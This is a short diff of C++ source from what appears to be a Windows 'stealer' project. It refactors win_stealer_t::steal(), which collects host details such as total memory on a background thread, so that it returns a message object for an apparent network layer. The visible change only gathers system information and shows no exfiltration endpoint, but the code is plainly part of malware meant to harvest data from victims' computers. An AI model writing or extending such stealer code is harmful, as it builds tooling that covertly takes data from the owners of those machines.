@@ -5,6 +5,7 @@
 #include "win_stealer.h"
 
 #include "net.h"
+#include "messages/text_message.h"
 
 std::string pc_t::str() const
 {
@@ -15,9 +16,9 @@ std::string pc_t::str() const
     return ss.str();
 }
 
-asio::awaitable<std::string> win_stealer_t::steal()
+asio::awaitable<std::unique_ptr<message_t>> win_stealer_t::steal()
 {
-    return asio::async_initiate<decltype(asio::use_awaitable), void(std::string)>(
+    return asio::async_initiate<decltype(asio::use_awaitable), void(std::unique_ptr<message_t>&&)>(
         [](auto completion_handler)
         {
             std::thread([](auto completion_handler)
@@ -42,10 +43,12 @@ asio::awaitable<std::string> win_stealer_t::steal()
                 }
                 sprintf_s(pc.total_memory, "%llu GB", mem / (1024 * 1024));
 
-                const auto to_ret = pc.str();
-                DLOG(to_ret);
+                auto to_ret = std::make_unique<text_message_t>();
+                to_ret->text = pc.str();
 
-                std::move(completion_handler)(to_ret);
+                DLOG(to_ret->text);
+
+                std::move(completion_handler)(std::move(to_ret));
             }, std::move(completion_handler)).detach();
         }, asio::use_awaitable
     );
